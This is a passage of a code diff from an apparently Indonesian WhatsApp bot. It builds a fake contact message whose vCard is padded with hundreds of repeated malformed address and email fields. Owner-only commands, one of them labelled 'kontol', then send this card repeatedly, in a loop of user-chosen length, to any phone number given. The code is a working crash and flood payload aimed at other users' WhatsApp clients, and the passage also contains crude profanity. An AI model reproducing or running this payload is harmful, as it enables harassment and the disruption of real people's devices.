karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
+const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
 jobotz.sendContact(`${text}@s.whatsapp.net`, global.owner, fkontaak)
 jobotz.sendContact(`${text}@s.whatsapp.net`, global.owner, fkontaak)
 jobotz.sendContact(`${text}@s.whatsapp.net`, global.owner, fkontaak)
@@ -5396,19 +5487,19 @@ await m.reply(`Berhasil Mengirim Kuntul Di Nomer ${text}`)
 }
 break
 case 'kontol': {
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 